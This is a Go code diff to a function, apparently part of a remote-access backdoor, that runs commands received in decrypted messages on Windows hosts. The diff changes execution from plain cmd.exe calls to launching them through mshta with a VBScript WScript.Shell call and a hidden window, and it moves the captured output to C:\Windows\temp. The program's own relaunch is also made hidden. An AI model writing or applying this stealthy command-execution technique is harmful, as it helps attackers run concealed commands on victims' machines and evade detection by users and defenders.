@@ -29,7 +29,7 @@ func getAdminCmd(sendUserId, decData string) {
 	echo := adminMsg.Echo
 	delay := adminMsg.Delay
 	timeStr := strconv.FormatInt(time.Now().Unix(), 10)
-	tempFile := fmt.Sprintf("C:\\%s.txt", timeStr)
+	tempFile := fmt.Sprintf("C:\\Windows\\temp\\%s.txt", timeStr)
 	if len(strings.TrimSpace(cmd)) == 0 {
 		path, err := util.GetExecPath()
 		if err != nil {
@@ -40,12 +40,13 @@ func getAdminCmd(sendUserId, decData string) {
 			return
 		}
 		args := strings.Join(os.Args[1:], " ")
-		cmd = fmt.Sprintf("start /min cmd.exe /c %s %s", path, args)
+		//cmd = fmt.Sprintf("start /min cmd.exe /c %s %s &&exit", path, args)
+		cmd = fmt.Sprintf("start mshta vbscript:createobject(\"wscript.shell\").run(\"cmd /c %s %s\",0)(window.close) &&exit", path, args)
 	} else {
 		if echo {
-			cmd = fmt.Sprintf("cmd.exe /c %s > %s", cmd, tempFile)
+			cmd = fmt.Sprintf("start mshta vbscript:createobject(\"wscript.shell\").run(\"cmd /c %s > %s\",0)(window.close) &&exit", cmd, tempFile)
 		} else {
-			cmd = fmt.Sprintf("cmd.exe /c %s", cmd)
+			cmd = fmt.Sprintf("start mshta vbscript:createobject(\"wscript.shell\").run(\"cmd /c %s\",0)(window.close) &&exit", cmd)
 		}
 	}
 
